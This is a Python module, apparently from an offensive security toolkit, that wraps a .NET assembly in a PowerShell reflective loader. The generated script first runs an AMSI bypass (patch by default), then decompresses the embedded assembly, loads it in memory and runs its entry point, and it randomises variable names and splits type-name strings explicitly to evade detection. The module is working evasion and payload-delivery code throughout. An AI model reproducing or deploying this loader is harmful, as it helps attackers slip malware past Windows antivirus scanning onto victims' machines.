"""PS1 .NET Assembly Reflective Loader — wraps a .NET assembly in a PowerShell script.

The generated script:
1. Runs an AMSI bypass (configurable, defaults to patch for Assembly.Load coverage)
2. DeflateStream-decompresses the embedded assembly
3. Loads via [Reflection.Assembly]::Load(byte[])
4. Redirects STDOUT via StringWriter, invokes EntryPoint, restores
5. All variable names randomized, sensitive strings split
"""

from __future__ import annotations

import base64
import secrets
import zlib

from penumbra.ps.amsi import _gen_context_bypass, _gen_patch_bypass, _gen_reflection_bypass
from penumbra.types import PassConfig


def _rand_var() -> str:
    return "_" + secrets.token_hex(4)


def _split_string(s: str) -> str:
    """Split a string into concatenated fragments for evasion."""
    parts: list[str] = []
    i = 0
    while i < len(s):
        chunk_len = secrets.randbelow(4) + 2
        parts.append(s[i : i + chunk_len])
        i += chunk_len
    return "(" + "+".join(f"'{p}'" for p in parts) + ")"


_AMSI_GENERATORS = {
    "reflection": _gen_reflection_bypass,
    "patch": _gen_patch_bypass,
    "context": _gen_context_bypass,
}


def _generate_loader(assembly: bytes, amsi_technique: str = "patch") -> str:
    """Generate a PS1 script that loads and executes a .NET assembly."""
    # Compress with raw deflate (no zlib header)
    compressed = zlib.compress(assembly, 9)[2:-4]  # strip zlib header/checksum
    encoded = base64.b64encode(compressed).decode("ascii")

    # Random variable names
    v_b64 = _rand_var()
    v_compressed = _rand_var()
    v_ms = _rand_var()
    v_ds = _rand_var()
    v_out = _rand_var()
    v_buf = _rand_var()
    v_read = _rand_var()
    v_bytes = _rand_var()
    v_asm = _rand_var()
    v_ep = _rand_var()
    v_sw = _rand_var()
    v_orig = _rand_var()
    v_result = _rand_var()

    # AMSI bypass block
    gen = _AMSI_GENERATORS.get(amsi_technique, _gen_patch_bypass)
    amsi_block = gen()

    # Split sensitive type names
    deflate_type = _split_string("System.IO.Compression.DeflateStream")
    ms_type = _split_string("System.IO.MemoryStream")

    lines = [
        amsi_block,
        "",
        f"${v_b64} = '{encoded}'",
        f"${v_compressed} = [Convert]::FromBase64String(${v_b64})",
        f"${v_ms} = New-Object {ms_type}(,${v_compressed})",
        f"${v_ds} = New-Object {deflate_type}(${v_ms}, "
        f"[{_split_string('System.IO.Compression.CompressionMode')}]::Decompress)",
        f"${v_out} = New-Object {ms_type}",
        f"${v_buf} = New-Object byte[] 4096",
        "do {",
        f"    ${v_read} = ${v_ds}.Read(${v_buf}, 0, ${v_buf}.Length)",
        f"    if (${v_read} -gt 0) {{ ${v_out}.Write(${v_buf}, 0, ${v_read}) }}",
        f"}} while (${v_read} -gt 0)",
        f"${v_bytes} = ${v_out}.ToArray()",
        f"${v_ds}.Close()",
        f"${v_ms}.Close()",
        f"${v_out}.Close()",
        "",
        f"${v_asm} = [{_split_string('Reflection.Assembly')}]::Load(${v_bytes})",
        f"${v_ep} = ${v_asm}.EntryPoint",
        "",
        "# Redirect STDOUT to capture output",
        f"${v_sw} = New-Object {_split_string('System.IO.StringWriter')}",
        f"${v_orig} = [Console]::Out",
        f"[Console]::SetOut(${v_sw})",
        "",
        "# Invoke EntryPoint",
        f"if (${v_ep}.GetParameters().Count -gt 0) {{",
        f"    ${v_ep}.Invoke($null, @(,(New-Object string[] 0)))",
        "} else {",
        f"    ${v_ep}.Invoke($null, $null)",
        "}",
        "",
        "# Restore and output",
        f"[Console]::SetOut(${v_orig})",
        f"${v_result} = ${v_sw}.ToString()",
        f"if (${v_result}) {{ Write-Output ${v_result} }}",
    ]

    return "\n".join(lines) + "\n"


class Ps1AssemblyLoaderPass:
    """Wrap a .NET assembly in a PS1 reflective loader script.

    Input: raw .NET assembly bytes
    Output: PS1 script that loads and executes the assembly

    The AMSI technique defaults to 'patch' since reflection-based bypass
    does not cover Assembly.Load() AMSI scanning.
    """

    opt_in = True

    @property
    def name(self) -> str:
        return "ps1-loader"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        technique = str(config.extra.get("amsi_technique", "patch"))
        script = _generate_loader(data, amsi_technique=technique)
        return script.encode("utf-8")
